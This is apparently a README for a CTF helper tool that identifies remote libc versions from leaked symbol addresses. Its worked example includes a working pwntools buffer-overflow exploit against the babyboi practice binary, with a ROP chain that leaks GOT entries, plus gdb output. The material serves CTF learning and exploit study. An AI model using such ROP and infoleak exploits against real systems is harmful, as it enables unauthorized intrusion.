# The_Night

Have you ever been in a ctf, and thought `If only I knew what libc version was running on the remote system, I could leverage this libc infoleak to get valid instruction pointer addresses`. This is a tool designed to identify libc versions on targets that you have libc infoleaks from, thus solving that problem.

## Referenced Work

This tool is based off of some already existing tools. The main reason why I made it, is so I could just easily call a single function from within my exploit, and it would handle the rest of the work for me.

```
https://github.com/niklasb/libc-database
https://libc.blukat.me/
```

## How Does it Work

So we all know that how we can leverage a libc infoleak to know where everything is in that region of memory. We take the infoleak, subtract the offset for whatever it is from it, and we get the base address. Then in order to get the address of anything else in libc, we just add the offset to what that is to the libc base.

So while the offset for one particular symbol, let's say `puts` will change when you compile the same libc multiple times, the offset between two symbols let's say `puts` and `printf` will not. So if we are able to leak the libc address for `puts` and `printf`, we can subtract the two addresses to get the offset. Then we can compare that against the offset for `puts` and `printf` to every other libc. If they match, then we know it is a possible libc version that they use.

To go a bit more into detail, during the setup it will scrape a bunch of libcs from `https://libc.blukat.me/`. Proceeding that in the setup it will use `readelf` to grab the symbols from all of those libcs, and store them in plaintext. Then when you use the tool, it will then just check the symbols for a matching offset.

## How Do I Use This?

First you import `TheNight`:
```
import TheNight
```

Then after that, you just call `TheNight.findLibcVersion`:
```
TheNight.findLibcVersion("puts", putsLibc, "gets", getsLibc)
```

It takes four arguments. The first one is the name of the first symbol you have a leak for. The second argument is the actual address for the symbol. The third is the name of the second symbol you have a leak for. The fourth is the libc address for that symbol.

## Setup

To install `TheNight`, there are two parts. The first part is to download the libcs, the second is to install the python module. The libcs are downloaded from a git repo that is hosted by `monik3r` (`https://github.com/monik3r`). To download the binaries:

```
$   python3 download.py
```

To install the python module:

```
$   sudo python setup.py
```

These two scripts will essentially do three things. The first is it will scrape a bunch of libcs from `https://github.com/monik3r/libcFun`. Then it will use `readelf` to grab symbols from all of the libcs (will not take a while). Lastly it will just install the `thenight.py` module.

If there is a custom libc you would like to add to `TheNight`, you can just copy it into the `/libcs/` directory, and then just rerun the installer. Although you might want to comment out the `grabLibcs` function, to save time by not rescraping.

## Example

So I'm going to be using `babyboi` from csaw quals 2019. If you want to look at a writeup for how it's solved, you can find it here:

```
https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic/csaw19_babyboi
```

Looking at the source code and the binary mitigations, it's clear we have a buffer overflow that we can exploit:

```
$    cat baby_boi.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv[]) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  char buf[32];
  printf("Hello!\n");
  printf("Here I am: %p\n", printf);
  gets(buf);
}
$    pwn checksec baby_boi
[*] '/Hackery/The_Night/example/baby_boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We can write a simple exploit which will just call `puts` twice, to leak the libc addresses for both `puts` and `gets`. If you want a more in depth explanation as to how that works, checkout `https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic/csawquals17_svc`:

```
import thenight
from pwn import *

# Establish the target
target = process('./baby_boi')
elf = ELF('baby_boi')
#gdb.attach(target)

# Our Rop Gadget to `pop rdi; ret`
popRdi = p64(0x400793)

# plt address of puts
puts = p64(elf.symbols["puts"])

# Parse out some output
print(target.recvuntil("ere I am: "))
target.recvline()

# Form our payload to leak libc address of puts and get by calling the plt address of puts twice, with it's argument being the got address of puts and then gets
payload = b""
payload += b"0"*0x28         
payload += popRdi                    # Pop rdi ; ret
payload += p64(elf.got["puts"])        # Got address for puts
payload += puts                     # Plt address puts
payload += popRdi                    # Pop rdi ; ret
payload += p64(elf.got["gets"])     # Got address for get
payload += puts                     # Plt address puts

# Send the payload
target.sendline(payload)

# Scan in the libc infoleaks
leak0 = target.recvline().strip(b"\n")
putsLibc = u64(leak0 + b"\x00"*(8-len(leak0)))

leak1 = target.recvline().strip(b"\n")
getsLibc = u64(leak1 + b"\x00"*(8-len(leak1)))

print("puts libc: %s" % hex(putsLibc))
print("gets libc: %s" % hex(getsLibc))

# Pass the leaks to The Night to figure out
thenight.find_libc_version("puts", putsLibc, "gets", getsLibc)

target.interactive()
```

When we run it:
```
$   python3 id_libc.py 
[+] Starting local process './baby_boi': pid 13778
[*] '/Hackery/TheNight/example/baby_boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b'Hello!\nHere I am: '
puts libc: 0x7fe3998fe5a0
gets libc: 0x7fe3998fdaf0
Offset:   0xab0
Symbol_0:  puts
Symbol_1:  gets
Address0: 0x7fe3998fe5a0
Address1: 0x7fe3998fdaf0
Possible libc: output-symbols-libc6_2.30-0ubuntu3_i386.so
Possible libc: output-symbols-libc6_2.30-0ubuntu2_i386.so
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$  

```

So the tool claims that we are using libc version `2.30`. When we check it in gdb, we see that is the case:


```
$    gdb ./baby_boi
GNU gdb (Ubuntu 8.3-0ubuntu1) 8.3
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
75 commands loaded for GDB 8.3 using Python engine 3.7
[*] 5 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./baby_boi...
(No debugging symbols found in ./baby_boi)
gef➤  r
Starting program: /Hackery/The_Night/example/baby_boi
Hello!
Here I am: 0x7ffff7e28d70
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7ed5272 in __GI___libc_read (fd=0x0, buf=0x7ffff7faea03 <_IO_2_1_stdin_+131>, nbytes=0x1) at ../sysdeps/unix/sysv/linux/read.c:26
26    ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007ffff7fae980  →  0x00000000fbad208b
$rcx   : 0x00007ffff7ed5272  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x00007fffffffdf18  →  0x00007ffff7e57d0f  →  <_IO_file_underflow+383> test rax, rax
$rbp   : 0x00007ffff7fb04a0  →  0x0000000000000000
$rsi   : 0x00007ffff7faea03  →  0xfb14d00000000000
$rdi   : 0x0               
$rip   : 0x00007ffff7ed5272  →  0x5677fffff0003d48 ("H="?)
$r8    : 0x0               
$r9    : 0x1a              
$r10   : 0x00000000004003cb  →  0x7475700073746567 ("gets"?)
$r11   : 0x246             
$r12   : 0x00007ffff7faf6a0  →  0x00000000fbad2887
$r13   : 0x00007ffff7faf8a0  →  0x0000000000000000
$r14   : 0xd68             
$r15   : 0x00007ffff7fb0608  →  0x00007ffff7e59ed0  →  <_IO_cleanup+0> endbr64
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf18│+0x0000: 0x00007ffff7e57d0f  →  <_IO_file_underflow+383> test rax, rax     ← $rsp
0x00007fffffffdf20│+0x0008: 0x0000000000000007
0x00007fffffffdf28│+0x0010: 0x00007ffff7fe11f0  →   endbr64
0x00007fffffffdf30│+0x0018: 0x0000000000000d68 ("h"?)
0x00007fffffffdf38│+0x0020: 0x00007ffff7fae980  →  0x00000000fbad208b
0x00007fffffffdf40│+0x0028: 0x00007ffff7fb04a0  →  0x0000000000000000
0x00007fffffffdf48│+0x0030: 0x0000000000601050  →  0x00007ffff7fae980  →  0x00000000fbad208b
0x00007fffffffdf50│+0x0038: 0x00007ffff7fb6540  →  0x00007ffff7fb6540  →  [loop detected]
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7ed526c <read+12>        test   eax, eax
   0x7ffff7ed526e <read+14>        jne    0x7ffff7ed5280 <__GI___libc_read+32>
   0x7ffff7ed5270 <read+16>        syscall
 → 0x7ffff7ed5272 <read+18>        cmp    rax, 0xfffffffffffff000
   0x7ffff7ed5278 <read+24>        ja     0x7ffff7ed52d0 <__GI___libc_read+112>
   0x7ffff7ed527a <read+26>        ret    
   0x7ffff7ed527b <read+27>        nop    DWORD PTR [rax+rax*1+0x0]
   0x7ffff7ed5280 <read+32>        sub    rsp, 0x28
   0x7ffff7ed5284 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "baby_boi", stopped, reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7ed5272 → __GI___libc_read(fd=0x0, buf=0x7ffff7faea03 <_IO_2_1_stdin_+131>, nbytes=0x1)
[#1] 0x7ffff7e57d0f → _IO_new_file_underflow(fp=0x7ffff7fae980 <_IO_2_1_stdin_>)
[#2] 0x7ffff7e590f6 → __GI__IO_default_uflow(fp=0x7ffff7fae980 <_IO_2_1_stdin_>)
[#3] 0x7ffff7e4aabd → _IO_gets(buf=0x7fffffffdfd0 "0\a@")
[#4] 0x400728 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /Hackery/The_Night/example/baby_boi
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /Hackery/The_Night/example/baby_boi
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /Hackery/The_Night/example/baby_boi
0x00007ffff7dc4000 0x00007ffff7de9000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.30.so
0x00007ffff7de9000 0x00007ffff7f61000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.30.so
0x00007ffff7f61000 0x00007ffff7fab000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.30.so
0x00007ffff7fab000 0x00007ffff7fae000 0x00000000001e6000 r-- /usr/lib/x86_64-linux-gnu/libc-2.30.so
0x00007ffff7fae000 0x00007ffff7fb1000 0x00000000001e9000 rw- /usr/lib/x86_64-linux-gnu/libc-2.30.so
0x00007ffff7fb1000 0x00007ffff7fb7000 0x0000000000000000 rw-
0x00007ffff7fcc000 0x00007ffff7fcf000 0x0000000000000000 r-- [vvar]
0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd0000 0x00007ffff7fd1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.30.so
0x00007ffff7fd1000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.30.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000023000 r-- /usr/lib/x86_64-linux-gnu/ld-2.30.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002b000 r-- /usr/lib/x86_64-linux-gnu/ld-2.30.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002c000 rw- /usr/lib/x86_64-linux-gnu/ld-2.30.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef➤  
```

Also if you want, here is a writeup where I used this tool to help solve a ctf challenge:

```
https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic/utc19_shellme
```

## Python2

If for some reason you want a `Python2` version of this module, check in that subdirectory.

## Misc

If anyone has any suggestions for this tool, this is probably the best place to reach me:

```
https://discord.gg/p5E3VZF
```

## What is The Night?

The Night is a super catchy metal song by Disturbed:

```
https://www.youtube.com/watch?v=YbwH5DADhDA
```
